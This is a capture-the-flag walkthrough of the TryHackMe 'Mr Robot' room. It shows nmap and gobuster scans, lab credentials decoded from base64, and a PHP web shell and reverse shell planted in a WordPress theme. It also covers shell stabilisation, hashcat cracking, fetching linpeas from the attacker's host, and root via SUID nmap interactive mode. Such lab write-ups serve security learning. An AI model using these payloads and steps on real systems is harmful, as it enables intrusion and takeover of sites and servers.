
## Mr Robot CTF - Try Hack Me

## 1. Overview

This one was a great box to come back into the game. It had a littlebit of everything. And not SSH for once, which is really uncommon. Here is a list over the things we went through on this box:

- NMAP
- Gobuster
- Wordpress reverse shell
- Stabalizing shell
- Hashcracking with hashcat
- Linpeas
- GTFO bins and SETUID Binaries
- NMAP interactive to root


Link to the machine: https://tryhackme.com/room/mrrobot



## 2. Oppgaver

### 2.1 Key 1

```sh
export IP=10.10.207.197
```

Kjører først en **NMAP** scan:
```sh
nmap -sV -sC -oA nmap/ $IP
```
NMAP sscan shows two open ports. Note that ssh port is closed

- ***80 http***
- ***443 ssl/http***



Kjører først en **Gobuster** scan:
```sh
gobuster dir -u http://$IP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.txt
```

Outputs the following:
```sh
/images               (Status: 301) [Size: 234] [--> http://10.10.55.43/images/]
/blog                 (Status: 301) [Size: 232] [--> http://10.10.55.43/blog/]
/sitemap              (Status: 200) [Size: 0]
/rss                  (Status: 301) [Size: 0] [--> http://10.10.55.43/feed/]
/login                (Status: 302) [Size: 0] [--> http://10.10.55.43/wp-login.php]
/0                    (Status: 301) [Size: 0] [--> http://10.10.55.43/0/]
/video                (Status: 301) [Size: 233] [--> http://10.10.55.43/video/]
/feed                 (Status: 301) [Size: 0] [--> http://10.10.55.43/feed/]
/image                (Status: 301) [Size: 0] [--> http://10.10.55.43/image/]
/atom                 (Status: 301) [Size: 0] [--> http://10.10.55.43/feed/atom/]
/wp-content           (Status: 301) [Size: 238] [--> http://10.10.55.43/wp-content/]
/admin                (Status: 301) [Size: 233] [--> http://10.10.55.43/admin/]
/audio                (Status: 301) [Size: 233] [--> http://10.10.55.43/audio/]
/intro                (Status: 200) [Size: 516314]
/wp-login             (Status: 200) [Size: 2657]
/css                  (Status: 301) [Size: 231] [--> http://10.10.55.43/css/]
/rss2                 (Status: 301) [Size: 0] [--> http://10.10.55.43/feed/]
/license              (Status: 200) [Size: 309]
/wp-includes          (Status: 301) [Size: 239] [--> http://10.10.55.43/wp-includes/]
Progress: 911 / 220561 (0.41%)                                                      [ERROR] 2021/10/24 08:20:44 [!] Get "http://10.10.55.43/README": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
/js                   (Status: 301) [Size: 230] [--> http://10.10.55.43/js/]
/Image                (Status: 301) [Size: 0] [--> http://10.10.55.43/Image/]
```

it also outputed /robots, and there we found a file called `key-1-of-3.txt` which contained the key for task one.


### 2.2 Key 2

When we go to $IP/License we see a lot of text, and scrolling down we find the following string: `ZWxsaW90OkVSMjgtMDY1Mgo=`.
We convert it from base64 and we get the following text: `elliot:ER28-0652`

This seemes like a username and password. We use it as credentials for the wp-login.

In the `THEMES` folder on the left hand pane there is a `Editor` tab that gives us the control over each theme structure and pages. We can now edit each page the way we want.

We then try to edit `archives.php` with different php scripts to see if it works:

```php
<?php system($REQUEST['testy']); ?>
```

OR:

```php
<?php echo "Hello world!<br>" ?>
```

we get feedback on the php line, which means we can edit in our own rev shell. We use Pentestmonkeys php rev shell.

We copy the contents of the php-rev-shell.php into the archives.php page, and then when we listen on the same port and access the file through our broswer we get a reverse shell.

- http://10.10.207.197/wp-content/themes/twentyfifteen/archive.php

This is very usefull for taking over a **wordpress** site, if it is misconfigured.



#### Updating to a **stable shell**:
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Do Ctrl + z

```bash
stty raw -echo
fg
export TERM=xterm
```


In the /home/robots folder we see a md5 hash as the password for the robot user:
`robot:c3fcd3d76192e4007dfb496cca67e13b`

Cracked it with **Hashcat**, and the password was:
`robot:abcdefghijklmnopqrstuvwxyz`

Line for **hashcat**
`hashcat -m 0 password-raw-md5.txt fsocity.dic`

NOTE: The hashfile that you use should ONLY have the hash, and not the username in there. Sound obvious, but i fucked up the first time because of it.

Output:
```bash
Session..........: hashcat
Status...........: Exhausted
Hash.Name........: MD5
Hash.Target......: c3fcd3d76192e4007dfb496cca67e13b
Time.Started.....: Tue Oct 26 16:26:12 2021, (1 sec)
Time.Estimated...: Tue Oct 26 16:26:13 2021, (0 secs)
Guess.Base.......: File (fsocity.dic)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1322.2 kH/s (0.51ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 0/1 (0.00%) Digests
Progress.........: 858085/858085 (100.00%)
Rejected.........: 0/858085 (0.00%)
Restore.Point....: 858085/858085 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 202055923456456e3f78e3f -> ABCDEFGHIJKLMNOPQRSTUVWXYZ
```

When we had the password we could simply log into the box by using this command to switch user (it does require a real shell - see above on how to stabelize shell):

```bash
su - robot
```

Then we type the password and we get a shell as the `robot` user.

Finally we can cat the `key2-of-3.txt` file in the robot home directory.



### 2.3 Key 3

Now we run **linpeas**:
This tended to crash the shell each time I tried to cat the output file. So I will just add the commands:

On our machine:
```sh
python3 -m http.server 9002
```

On the victim machine:
```sh
wget "http://"OUR_IP":9002/linpeas.sh"
```

This will download Linpeas.sh, and we can use chmod +x and then run it on the victim machine.

The output gave us a red flag on **NMAP** as a potential set UID binary. NMAP was run as `root`. So we go to the good old trusty `gtfobins` and find the NMAP command. It tells us that we can spawn a shell from the interactive mode in NMAP. And we get a root shell by simply doing the following:

```sh
nmap --interactive
!sh
```

- *Source*: https://gtfobins.github.io/gtfobins/nmap/
